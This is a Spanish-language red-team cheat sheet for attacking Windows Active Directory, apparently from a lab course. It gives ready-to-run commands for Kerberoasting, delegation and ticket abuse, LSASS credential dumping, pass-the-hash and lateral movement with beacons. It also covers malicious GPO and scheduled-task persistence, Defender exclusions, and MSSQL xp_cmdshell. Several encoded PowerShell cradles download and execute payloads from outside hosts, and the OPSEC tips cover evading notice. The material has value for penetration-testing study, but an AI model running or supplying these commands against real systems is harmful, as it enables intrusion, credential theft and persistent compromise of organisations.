# Domain Enumeration

### Basic Domain Enumeration
**cmd - Domain Enumeration**
```shell
ipconfig /all
route print
net config workstation

nltest /dclist:[Domain] \ 
echo %LOGONSERVER% 


net group /domain
net user /domain
net user [User] /domain
net config workstation
net use


# Listamos Recursos del equipo
net view \\[Host] /all				

#wmic
run wmic service get name,pathname
run wmic logicaldisk get caption
```

**Local Computer Enumeration**
```batch
net user
net user [User]

net localgroup
net localgroup [Administradores]

whoami /user 
whoami /all /fo list
whoami /priv

#(Politica de seguridad del dominio)

net accounts /domain \
Get-DomainPolicyData		
```

#### Ldap Search 
```batch
LDAP:
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(objectclass=group)"
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=group)(name=[groupname]))"
	ldapsearch -H ldap://test.local -b DC=test,DC=local "(&(objectclass=group)(name=*admin*))"
```

---
## 🔍 PowerView Enumeration 
**Ubicar Sesiones de usuarios logueados**
```powershell
net sessions \\dc-2
```

**Enumera las sesiones conectadas**
```powershell
Get-NetSession -ComputerName dc-2 | select CName, UserName
```

**Informacion del dominio actual**
```powershell
Get-Domain -Domain dev.evilcorp.local
Get-DomainController -Domain dev.evilcorp.local | select Forest, Name, OSVersion | fl
```

**Bosques del dominio**
```powershell
Get-ForestDomain -Forest evilcorp.local
```

**Mapear todo el dominio y sus relaciones**
```powershell
powershell Invoke-MapDomainTrust | select SourceName,TargetName,TrustDirection
```

**Confianzas del dominio**
```powershell
powershell Get-DomainTrust -Domain dev.evilcorp.local
```

**Enumerar Computadoras del dominio**
```powershell
Get-DomainComputer -Properties dnshostname,operatingsystem | sort -Property Dnshostname
```

**Enumeraciones de usuario**
```powershell
Get-DomainUser -Properties Samaccountname,description
```

**Enumerar un usuario especifico**
```powershell
Get-DomainUser -Identity "[USER]" -Properties Displayname,Memberof | fl
```

**Enumeracion de grupos**
```powershell
Get-DomainGroup -Domain dev.evilcorp.local -Properties samaccountname
powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```
**Enumerar Grupos filtrando por un patron**
```powershell
Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
```

**Enumerar usuarios que pertenecen al grupo Domain Admins**
```powershell
Get-DomainGroupMember -Identity "Admins. del dominio" -Domain dev.evilcorp.local
```

**Enumerar usuarios del grupo Domain admins pero listando el valor del elemento MemberDistinguishedname**
```powershell
Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
```

**Buscar Recursos Compartidos Accesibles**
```powershell
Invoke-ShareFinder -CheckShareAccess -Verbose -Threads 100
```

**Buscar las máquinas de dominio en las que esos usuarios están conectados 🚩**
```powershell
Find-DomainUserLocation 
```

---
### **OU** Unidades Organizativas Y **GPOS** del dominiio
**OU Enumeration**
```powershell
Get-DomainOU -Properties Name | sort -Property Name
```

**Gpo Enumeration**
```powershell
Get-DomainGPO -Properties DisplayName | sort -Property Displayname
```

**Gpo Applied in a computer**
```powershell
Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName
```

**Devuelve todos los GPO que modifican la pertenencia a grupos locales a través de Grupos restringidos**
```powershell
Get-DomainGPOLocalGroup | select GPODisplayName, GroupName
```

**Enumera las máquinas donde un usuario/grupo de dominio específico es miembro de un grupo local específico**

```powershell
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName
```

**Busca usuarios con permisos para crear GPOS en el dominio (Generalmente son los Administradores)**
```powershell
Get-DomainObjectAcl -SearchBase "CN=Enterprise Admins,CN=Users,DC=rto,DC=local" -ResolveGUIDs | ?{ $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
```

**Convertir el SID para enumerar el objeto**
```powershell
ConvertFrom-SID S-1-5-21-2697495467-513533215-122973509-1137
```

---
## 🏴‍☠️ Attacks 

#### Kerberoasting
Tanto Kerberoasting como ASREPROASTING **nos sirve solamente para Crackear el ticket**
**Detect** 🕵️‍♂️

```powershell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname,lastlogon
```

**Attacking** ⚔

Rubeus

```shell
execute-assembly /opt/tools/rubeus/Rubeus.exe kerberoast /user:svc_test /nowrap
```


**Powerview**
```powershell
1. Get-DomainSPNTicket -SPN "MSSQLSvc/sqlserver.targetdomain.com"
2. Invoke-Kerberoast -Domain dev.evilcorp.local -Identity "svc_test" | fl | Out-File -Encoding UTF8 -FilePath c:\ProgramData\Kerberoast.txt -Append -Force
```

**IMPACKET** 
```powershell
GetUsersSPN.py dev.evilcorp.local/[$user]:[$Pass] -request-user "svc_test"
```

##### Cracking 🪓
**hashcat**
```shell
hashcat -a 0 -m 13100 hash.txt $(pwd)/rockyou.txt --rules-file $(pwd)/hashcat/rules/best64.rule
```

**john**
```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

#### ASREPROASTING
**Detect** 🕵️‍♂️
```powershell
Get-DomainUser -PreAuthNotRequired | select samaccountname,description,lastlogon
````

**Attacking** ⚔

**Rubeus**
```java
execute-assembly /opt/tools/rubeus/Rubeus.exe asreproast /user:c.rodolfo /nowrap
```

**Impacket**

```powershell
GetNPUsers.py DEV/c.rodolfo -no-pass
GetNPUsers.py dev.evilcorp.local/ -no-pass -usersfile users.txt
```


#### Unconstrained Delegation 🔗 Podemos encadenarlo con Printer Bug
**Permite que un usuario actue en nombre de otro usuario u otro servicio**. además podemos encadenar esta vulnerabilidad con el error de la impresora ('spoolsample')

**Detect** 🕵️‍♂️
```powershell
Get-DomainComputer -Unconstrained | select Dnshostname,operatingsystem
```

**SpoolSample**
```shell
execute-assembly c:\Binaries\Rubeus.exe monitor /interval:10 /nowrap
execute-assembly c:\Binaries\SpoolSample.exe dc-2 srv-1
```

Podemos usar el ticket si lo convertimos de B64 a su formato nativo o podemos usar rubeus

```shell
Rubeus.exe ptt /ticket:<base64ticket>
```

#### Constrained 🔗 Podemos encadenarlo con Alternative Service   

**a diferencia de Unconstrained, Constrained Restringe los servicios a lo que el Usuario puede aceder**

>**Para aprovecharnos de **Alternative Service** debemos primero hacernos con la maquina, pedir su tgt, impersonalizar y alternar el servicio.**

**Detect** 🕵️‍♂️

Enumerate Users and Computers with constrained delegation

```powershell
Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select name,msds-allowedtodelegateto
```

**Attacking** ⚔

Primero necesitamos un ticket de usuario para pedir el vale de servicio.

1. Pidiendo un TGT desde el usuario que tiene un vale para el TGS
```java
execute-assembly /opt/tools/rubeus/Rubeus.exe tgtdeleg /nowrap
```

**Alternativa**
Solicitando un TGT si es que tenemos el hash o la contraseña del usuario

```shell
execute-assembly /opt/tools/rubeus/Rubeus.exe asktgt /user:svc_test /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap
```

2. Solicitando el TGS e impersonalizando a un usuario Administrador en la computador que tiene el **Unconstraied Delegation**

```shell
#(S4U con Ticket)
execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /ticket:[..Ticket..] /nowrap

#(RC4 | AES256)
execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap

#(Tambien Podemos Carga el ticket directamente en memoria /ptt)
execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:svc_test /impersonateuser:Sadam /msdsspn:cifs/sql-1.dev.evilcorp.local /rc4:2e39dc7d0f27069d7bcabb8670a9348b /nowrap /ptt

```

3. Utilizando el Ticket de servicio


```shell
#(powershell)
[System.IO.File]::WriteAllBytes("c:\users\administrator\desktop\dc2-tgt.kirbi", [System.convert]::FromBase64String("[..ticket..]"))
kerberos_ticket_use "c:\users\administrator\desktop\dc-2tgt.kirbi"

#(Alternativa)
execute-assembly /opt/tools/rubeus/Rubeus.exe ptt /ticket:[..ticket..]

```


##### Alternative Service 
¿Qué pasa si tenemos derechos de delegación solo para un SPN específico?
- Aun podemos abusar de una funcion de kerberos llamada "Servicio Alternativo" .Esto nos permite solicitar un TGS para otro servicio 'Alternativo' ,lo que nos da la posibilidad de solcitar un TGS para un servicio que el host admita

```shell
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Debug\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:eventlog/dc-2.dev.cyberbotic.io /altservice:cifs /user:srv-2$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /ptt
```

**example**: 

```powershell
# Detect
Get-DomainComputer -TrustedToAuth | select -exp msds-allowedtodelegateto

samaccountname: WINDOWSSERVER$
-----
Result
-----
eventlog/dc-2.dev.evilcorp.local/dev.evilcorp.local
eventlog/dc-2.dev.evilcorp.local
eventlog/DC-2
eventlog/dc-2.dev.evilcorp.local/DEV
eventlog/DC-2/DEV
cifs/WKSTN-1.dev.evilcorp.local
cifs/WKSTN-1
----------

# Primero nos hacemos con el TGT de la maquina con el constrained delegation
execute-assembly /opt/tools/rubeus/Rubeus.exe triage
execute-assembly /opt/tools/rubeus/Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap || \
mimikatz sekurlsa::ekeys

# Impersonalizamos y Alternamos el servicio
execute-assembly /opt/tools/rubeus/Rubeus.exe s4u /user:WINDOWSSERVER$ /impersonateuser:Administrador /msdsspn:eventlog/dc-2.dev.evilcorp.local /altservice:cifs /ticket:[..KRBTGT/WINDOWSSERVER..] /nowrap

# Exportamos el ticket
echo "[..Ticket..]" | base64 -d > Cifs-Dc-2.kirbi

# Lo utilizamos
readlink -f Cifs-Dc-2.kirbi | xclip -sel clip
kerberos_ticket_use 
```

---
## 🥷 Lateral Movements 

```batch

#(Jump)
jump psexec64 SRV-1 WKSTN-1-PIVOT4444
jump psexec_psh SRV-1 WKSTN-1-PIVOT4444
jump winrm64 SRV-1 WKSTN-1-PIVOT4444

#(Ejecutar un comando de powershell remotamente)
remote-exec winrm dc-2 Get-MpThreatDetection | select ActionSuccess, DomainUser, ProcessName, Resources

#(wmi utiliza "process call create" de wmic sirve para ejecutar un binario o dll)
remote-exe wmi srv-1 cmd.exe /c calc.exe
remote-exe wmi srv-2 notepad.exe
remote-exec wmi WINDOWSSERVER rundll32 c:\programdata\beacon.dll,StartW

cd \\sql-1\c$\Programdata
upload beacon-svc.exe
remote-exec wmi sql-1 c:\Programdata\beacon-svc.exe
(link|connect) sql-1 

#(Wmic Example)
shell wmic /node:"srv-1.dev.cyberbotic.io" process call create "c:\programdata\pivot-4444.exe"

#(Wmi Examples)
remote-exec wmi SRV-1 c:\Programdata\pivot-4444.exe

### Pass the hash rc4 - ntlm
lsadump::sam 			 		-> Only Local Accounts
sekurlsa::logonpasswords	    -> Usuarios logueados en el sistema

#(cobalt)
pth DEV\jking 4ffd3eabdce2e158d923ddec72de979e

ls \\srv-2\c$
```

## Execute Remote Commands - Remote-exec
```powershell
start wmic /node:@C:\\share$\\comps1.txt /user:"DOMAIN\\Administrator" /password:"PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \\\\dc-2\\share$\\fx166.exe %APPDATA%\\fx166.exe & %APPDATA%\\fx166.exe"

#(Dump Credentials LSSAS)
shell wmic /node:[target] process call create "cmd /c rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump PID C:\\ProgramData\\lsass.dmp full"

```

### GPO Recon

```powershell
1. Get-DomainOU -Domain dev.cyberbotic.io -Properties Name				-> List OU
Get-DomainOU -Identity "$NAME" 							-> Retrieve Distinguishedname

#List computers
Get-DomainComputer -Searchbase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"     ->Properties dnshostname,name,operatingsystem

# List Gpos From a OU
1. Get-DomainOU -Identity "$NAME"								-> Gplink cn=*
Get-DomainGPO -Identity "{16927C64-CF83-4962-B0CF-6F90710F19C8}"	        -> Identificar Gpo aplicadas a una OU

# Obtenga grupos restringidos establecidos a través de GPO, busque membresías de grupos interesantes forzadas a través del dominio
Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers

# Obtenga las computadoras donde los usuarios forman parte de un grupo local a través de un grupo restringido de GPO
Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl  

ObjectDN                                          ActiveDirectoryRights SecurityIdentifier                          
--------                                          --------------------- ------------------                          
CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local           CreateChild S-1-5-21-2697495467-513533215-122973509-1137

# Identificando el SID al objeto correspondiente
powershell ConvertFrom-SID "S-1-5-21-2697495467-513533215-122973509-1137"

#Encuentre ACL interesantes para todo el dominio, muéstrelas en un formato legible (de izquierda a derecha)
Find-InterestingDomainAcl | select identityreferencename,activedirectoryrights,acetype,objectdn | ?{$_.IdentityReferenceName -NotContains "DnsAdmins"} | ft
```

### Enumeration GPO

**Consulta devuelve los SID de usuario/grupo que puede crear nuevos GPO en el dominio**

```powershell
powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-2697495467-513533215-122973509-1137

powershell Convert-FromSID "S-1-5-21-2697495467-513533215-122973509-1137"
DEV\1st line Support
````

**A menudo encontrará instancias en las que los usuarios y/o grupos pueden modificar los GPO existentes.**

Esta consulta devolverá cualquier GPO en el dominio, donde un RID de 4 dígitos tenga WriteProperty , WriteDacl o WriteOwner.

```powershell
powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-2323903455-1895497758-3703895482-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN={911DBB17-FE3C-403F-9CA6-0B01E512A95C},CN=Policies,CN=System,DC=dev,DC=evilcorp,DC=local
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-2697495467-513533215-122973509-1114

powershell ConvertFrom-SID "S-1-5-21-2697495467-513533215-122973509-1114"
DEV\Developers
```

Llegamos a la conclusion de que los usuarios del grupo **"1st line support"** pueden crear GPOS y Linkearlas a Unidades organizativas, lo que implica que tenemos un escenario para escalar privilegios rapidamente.

para resolver el objeto.

```powershell
powershell Get-DomainGPO -Name "{911DBB17-FE3C-403F-9CA6-0B01E512A95C}"

Result
---
displayname              : Powershell Logins
```

**BloodHound 🐲**

Filter :

```txt
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p
```

**IMPORTANTE - SE USA CON OYENTES INVERSOS TCP PARA EVITAR CONEXCIONES SALIENTES EN EL DOMINIO (PIVOT LISTENER)**

a tener en cuenta que si :
- Si el puerto **445** está cerrado en el destino, no podemos usar agentes de escucha SMB.
- Si el **firewall** de destino no permite la entrada de puertos arbitrarios, no podemos usar escuchas **TCP**.
- Si la máquina actual no permite la entrada de puertos arbitrarios, no podemos usar escuchas Pivot.

**⛩ Puede ser estrategicamente necesario abrir puertos en el windows de firewall para facilitar el movimiento lateral ⛩.**

 Para habilitar esta regla.
```cmd
netsh advfirewall firewall add rule name="Allow 4444" dir=in action=allow protocol=TCP localport=4444      -> TCP
```

Para Deshabilitar.
```cmd
netsh advfirewall firewall delete rule name="Allow 4444" protocol=TCP localport=4444
```

#### Rsat  Remote Server Administration Tools
Es un componente de administracion proporcionado por microsoft para administrar componentes en un dominio, y que a menudo se encuentra en servidores y estaciones de trabajo de administracion, puede ser util.

El módulo **GroupPolicy** tiene varios cmdlets de PowerShell que se pueden usar para administrar GPO, incluidos:

|**Comando**                 |**Explanation**                                                                                                         |
| --------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| **New-GPO**                 | crea un nuevo GPO vacío.                                                                                              |
| **New-GPLink**              | vincule un GPO a un sitio, dominio o unidad organizativa.                                                             |
| **Set-GPPrefRegistryValue** | configura un elemento de preferencia del registro en la configuración del equipo o del usuario.                       |
| **Set-GPRegistryValue**     | configura una o más configuraciones de políticas basadas en el registro en la configuración del equipo o del usuario. |
| **Get-GPOReport**           | genera un informe en formato XML o HTML.                                                                              | 


para comprobar si el modulo esta instalado podemos utilizar:

```powershell
Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
```

En un apuro, puede instalarlo 
```powershell
Install-WindowsFeature –Name GPMC  -> como administrador local
```
---

Crear y linkear una GPO a una unidad Organizativa

```powershell
powershell New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=evilcorp,DC=local"

GpoId       : 3451d1c7-f482-46d3-a756-9036684aa295
DisplayName : Evil GPO
Enabled     : True
Enforced    : False
Target      : OU=Workstations,DC=dev,DC=evilcorp,DC=local
Order       : 4
```

OPSEC 🇦🇱 : **el GPO será visible en la Consola de administración de directivas de grupo y otras herramientas RSAT GPO, así que asegúrese de que el nombre sea "convincente"**

Ser capaz de escribir cualquier cosa, en cualquier lugar en las colmenas **HKLM o HKCU** presenta diferentes opciones para lograr la ejecución del código. Una forma sencilla es crear un nuevo valor de ejecución automática para ejecutar una carga útil de Beacon en el arranque.

debemos identificar donde alojar nuestro payload para que cuando las gpos se actualizen apunten a nuestro payload
 
```powershell
beacon> powershell Find-DomainShare -CheckShareAccess

Name           Type Remark              ComputerName
----           ---- ------              ------------
software          0                     dc-2.dev.cyberbotic.io
```

Creamos un valor de registro en nuestra GPO.

```powershell
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\gpo.exe" -Type ExpandString 

#fix
powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\gpo.exe" -Type ExpandString 

DisplayName      : Evil GPO
DomainName       : dev.evilcorp.local
Owner            : DEV\jking
Id               : 3451d1c7-f482-46d3-a756-9036684aa295
GpoStatus        : AllSettingsEnabled
Description      : 
CreationTime     : 16/02/2022 14:41:24
ModificationTime : 16/02/2022 14:59:58
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 1, SysVol Version: 1
WmiFilter        : 

```

Cada máquina normalmente actualizará sus GPO automáticamente **cada dos horas**. 

Para hacerlo manualmente 
```batch
gpupdate /target:computer /force
```

OPSEC 🇦🇱 : ¡También notará que esto deja un símbolo del sistema en la pantalla!
Una mejor manera de hacerlo podría ser 
```cmd
%COMSPEC% /b /c start /b /min
```

#### SharpGPO Abuse 🦈

**SharpGPO** Permite agregar una gama mas amplica de configuraciones abusivas en una gpo.
No puede crear GPO, por lo que todavía debemos hacerlo con **RSAT** o modificar a la que ya tenemos acceso de escritura. En este ejemplo, agregamos una tarea programada inmediata al GPO de registro de PowerShell, que se ejecutará tan pronto como se aplique.

```powershell

beacon> execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Debug\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"

[+] Domain = dev.cyberbotic.io
[+] Domain Controller = dc-2.dev.cyberbotic.io
[+] Distinguished Name = CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
[+] GUID of "PowerShell Logging" is: {AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}
[+] Creating file \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new immediate task. Wait for the GPO refresh cycle.
[+] Done!
```


#### Enumerando Defensas SeatBelt 
con seatbelt podemos enumerar la maquina remotamente, para analizar 

```cmd
execute-assembly /opt/tools/Seatbelt.exe -group=system -computername=sql-1.dev.evilcorp.local -outputfile="c:\programdata\seatbelt.txt"
```	

**la data importante se encuentra en esta salida**
```txt
====== AppLocker ======
[*] Applocker is not running because the AppIDSvc is not running

====== LAPS ======
LAPS Enabled                  : True

====== OSInfo ======
IsLocalAdmin                  :  False

====== PowerShell ======
Script Block Logging Settings
Enabled                       : True

====== Services ======
Non Microsoft Services (via WMI)

Name                          : Sysmon64
BinaryPath                    : C:\Windows\Sysmon64.exe
FileDescription               : System activity monitor

====== Sysmon ======
ERROR: Unable to collect. Must be an administrator.

====== UAC ======
[*] LocalAccountTokenFilterPolicy == 1. Any administrative local account can be used for lateral movement.

====== WindowsFirewall ======
Domain Profile
  Enabled                  : False

Private Profile
  Enabled                  : False

Public Profile
  Enabled                  : False
```

Enumerar el entorno del usuario `-group=user`puede ser igualmente importante. Por ejemplo, esta entrada de unidad asignada nos muestra que los elementos del perfil del usuario están montados en un recurso compartido remoto.

```txt
Mapped Drives (via WMI)

  LocalName                      : H:
  RemoteName                     : \\dc-2\home$\bfarmer
  RemotePath                     : \\dc-2\home$\bfarmer
  Status                         : OK
  ConnectionState                : Connected
  Persistent                     : False
  UserName                       : DEV.CYBERBOTIC.IO\bfarmer
  Description                    : RESOURCE CONNECTED - Microsoft Windows Network
```

Algunos de los **comandos de Seatbelt** también se pueden ejecutar de **forma remota**, lo que puede ser útil para enumerar las defensas antes de saltar a él equipo

**SeatBelt**

```java
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe powershell -computername=srv-1
```

#### Defender Exclusion

```
#(Checkear ruta de exclusiones del defender de manera remota)
remoto-exec winrm dc-2 Get-MpPreference | seleccione Exclusión* 

#(Parsear GPO Descargada de exclusiones)
Parse-PolFile .\Registry.pol 

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions 
ValueName : Exclusions_Paths 
ValueType : REG_DWORD 
ValueLength : 4 
ValueData : 1 

KeyName : Software\Policies\Microsoft\Windows Defender\Exclusions\Paths 
ValueName: C:\Windows\Temp 
ValueType: REG_SZ 
ValueLength: 4 
ValueData: 0

#(Configurar Ruta de exclusion)
Set-MpPreference -ExclusionPath "<path>"

```

## MSSQL 
tag : #mssql
**global variables defined**
`SELECT @@version`, `SELECT DB_NAME()`, `SELECT @@SERVERNAME`

#### Enumeration

```powershell
# Enumerar instancias
powershell Get-SQLInstanceDomain | Get-SQLConnectionTest

ComputerName             Instance                      Status    
------------             --------                      ------    
sql-1.dev.evilcorp.local sql-1.dev.evilcorp.local,1433 Accessible


# Enumerar Informacion del servidor
ComputerName           : sql-1.dev.evilcorp.local
Instance               : SQL-1										-> Nombre de la instancia
DomainName             : DEV
ServiceProcessID       : 2640
ServiceName            : MSSQLSERVER
ServiceAccount         : sql-service@dev.evilcorp.local 			-> Cuenta en la que corre el servicio
AuthenticationMode     : Windows Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 13.0.5026.0
SQLServerMajorVersion  : 2016
SQLServerEdition       : Express Edition (64-bit)
SQLServerServicePack   : SP2
OSArchitecture         : X64
OsMachineType          : ServerNT
OSVersionName          : Windows Server 2016 Standard Evaluation
OsVersionNumber        : SQL
Currentlogin           : DEV\johndoe
IsSysadmin             : Yes										-> Johndoe Is Admin
ActiveSessions         : 1

# Enumerar Instancias Linkeadas en distintos servidores
powershell Get-SQLServerLinkCrawl -Instance "sql-1.dev.evilcorp.local,1433"

Version     : SQL Server 2016 
Instance    : SQL-1
CustomQuery : 
Sysadmin    : 1
Path        : {SQL-1}
User        : DEV\johndoe
Links       : {SQL-2.SUCURSAL.EXTERNAL}								-> Instancia externa en dominio diferente

Version     : SQL Server 2016 
Instance    : SQL-2\SQLEXPRESS
CustomQuery : 
Sysadmin    : 1
Path        : {SQL-1, SQL-2.SUCURSAL.EXTERNAL}
User        : sa
Links       : 

# Informacion Util
powershell Get-SQLServerLinkCrawl -Instance "SQL-2.SUCURSAL.EXTERNAL" -Query "select * from master..syslogins" | ft

# Consultas
powershell Get-SQLQuery -Instance "sql-1.dev.evilcorp.local,1433" -Query "exec xp_cmdshell 'net config workstation'" 

# Login Impacket/MSSQLClient
proxychains python3 mssqlclient.py dev/johndoe:Password1\!@10.10.40.221 -dc-ip 10.10.40.100 -windows-auth

```


#### XP_CMDSHELL

```sql
#(habilitando funciones avanzadas de MSSQL) 
sp_configure 'show advanced options', '1' 
RECONFIGURE 

#(Habilitando xp_cmdshell) 
sp_configure 'xp_cmdshell', '1' 
RECONFIGURE 

#(Ejecutando Comandos via xp_cmshell) 
EXEC xp_cmdshell 'whoami'; GO
```


```sql
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell' ;
SELECT * FROM master..sysservers ;
SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select @@SERVERNAME') ;


SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select @@SERVERNAME')
SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select  * from sys.configurations where name = ''xp_cmdshell'' ')
SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select @@SERVERNAME ; exec xp_cmdshell ''powershell -nop -w hidden -enc $B64PAYLOAD'' ')

SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'SELECT * FROM OPENQUERY("SQL01.ZEROPOINTSECURITY.LOCAL", ''SELECT @@SERVERNAME'')')
SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'SELECT * FROM OPENQUERY("SQL01.ZEROPOINTSECURITY.LOCAL", ''SELECT * FROM sys.configurations WHERE name = ''''xp_cmdshell '''' '')')
SELECT * FROM OPENQUERY("SQL-1.CYBERBOTIC.IO", 'select * FROM OPENQUERY("sql01.zeropintsecurity.local", ''SELECT @@SERVERNAME ; xp_cmdshell ''''powershell -nop -w hidden -enc $B64PAYLOAD '''' '')')

```


#### RPC OUT
```sql

# Enabling xp_cmdshell
EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql.rto.external]
EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql.rto.external]

# Revshell

EXECUTE('EXEC xp_cmdshell ''hostname && whoami'';') AT [sql.rto.external]

EXECUTE('EXEC xp_cmdshell ''powershell -nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADIAMwAuADUANQA6ADgAMAA4ADAALwBiACIAKQApAAoA'';') AT [sql.rto.external]

```

---

### Persistencia con SharpPersist 🧲

El programador de tareas de windows nos permite crear "tareas" que se ejecutan con un 'disparador' predeterminado, ese evento podria ser una hora del dia, o la sesion de inicio de algun usuario

##### Creando Tarea Programada
**En Linux**

```bash
root@kali:~# str='IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))' 
root@kali:~# echo -en $str | iconv -t UTF-16LE | base64 -w 0 
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAAh=AKADAAL
```

**En Windows**

```batch
PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://10.10.5.120/a"))'
PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==
```

Creando una tarea programada en sharpersist

```java
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Debug\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgA1AC4AMQAyADAALwBhACIAKQApAA==" -n "Updater" -m add -o hourly
```

Donde:


| **Argumentos** | **Explanation**                      |
| ---------- | -------------------------------- |
| `-t`         | **Tecnica de persistencia deseada**  | 
| `-c`         | **Comando a ejecutar**               |
| `-a`         | **Argumentos para ese comando**      |
| `-n`         | **Nombre de la tarea**               |
| `-m`         | **Modo (add, remove, check y list)** |
| `-o`         | **Es la frecuencia de la tarea**     |

##### Startup Folder

